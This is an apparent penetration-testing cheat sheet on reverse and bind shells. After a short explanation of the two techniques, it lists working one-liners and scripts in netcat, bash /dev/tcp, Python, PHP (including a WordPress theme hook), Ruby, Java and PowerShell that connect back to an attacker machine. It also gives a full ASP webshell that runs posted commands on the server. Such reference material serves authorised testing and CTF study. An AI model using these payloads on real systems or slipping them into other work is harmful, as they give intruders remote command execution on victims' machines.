# Common shells

## Types of shells

Shells are used for interfacing with a Command Line environment (CLI) like the common `bash` or `sh` programs in Linux, and the `cmd.exe` and `Powershell` on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

### Reverse shell

Reverse shells are when the target is forced to execute code that connects back to the attack computer. This requires setting up a listener which would be used to receive the connection on the attack machine. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target.

1. Start a listener on attack machine
2. Start a reverse shell on target machine

### Bind shell

Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be open up a port to receive on that you can connect to, and obtain remote code execution. This has the advantage of not requiring any configuration on the attack network, but may be prevented by firewalls protecting the target.

1. Start a listener on target machine
2. Connect to listener on target from attack machine

## Windows bind shells

In some versions of netcat (including the `nc.exe` Windows version included with Kali at 
`/usr/share/windows-resources/binaries`, and the version used in Kali itself) there is a `-e` option which allows 
for executing a process on connection:

    nc -lvnp <port-number> -e /bin/bash

Connecting to the above listener with netcat would result in a bind shell on the target.

## Windows reverse shells

Netcat:

    nc <IP address attack machine> <port-number> -e C:\Windows\System32\cmd.exe

Python:

```python
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<IP address attack machine>",<port-number>))

p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

ASP (Credit: Maceo – maceo @ dogmile.com):

```text
<%@ Language=VBScript %>
<%
  Dim oScript
  Dim oScriptNet
  Dim oFileSys, oFile
  Dim szCMD, szTempFile

  On Error Resume Next

  ' -- create the COM objects that we will be using -- '
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  ' -- check for a command that we have posted -- '
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then

    ' -- Use a poor man's pipe ... a temp file -- '
    szTempFile = "C:\" & oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)

  End If

%>
<HTML>
<BODY>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
<%
  If (IsObject(oFile)) Then
    ' -- Read the output from our command and remove the temp file -- '
    On Error Resume Next
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%>
</BODY>
</HTML>
```

## Linux bind shells

On Linux, use this code to create a listener for a bind shell:

    mkfifo /tmp/f; nc -lvnp <port-number> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

## Linux reverse shells

Netcat:

    nc <IP address attack machine> <port-number> -e /bin/sh

Netcat Traditional (like the one on Kali):

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attack machine> <port-number> >/tmp/f;/tmp/f

Python:

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP address attack machine>",<port-number>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Bash:

    bash -i >& /dev/tcp/<IP address attack machine>/<port-number> 0>&1

PHP:

    php -r '$sock=fsockopen("<IP address attack machine>",<port-number>);exec("/bin/sh -i <&3 >&3 2>&3");'

PHP alternative 1:

    php -r '$sock=fsockopen("<IP address attack machine>",<port-number>);$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);'

PHP alternative 2:

    <?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attack machine> <port-number> >/tmp/f'); ?>

PHP WordPress:

    <?php if(is_home()) { exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address attack machine> <port-number> >/tmp/f'); } ?>

Ruby:

    ruby -rsocket -e'f=TCPSocket.open("<IP address attack machine>",<port-number>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java:

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address attack machine>/<port-number>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

## Windows server reverse shells

The standard one-liner PSH reverse shell:

    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port-number>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Copy into a `cmd.exe` shell or another method of executing commands on a Windows server, such as a webshell. 
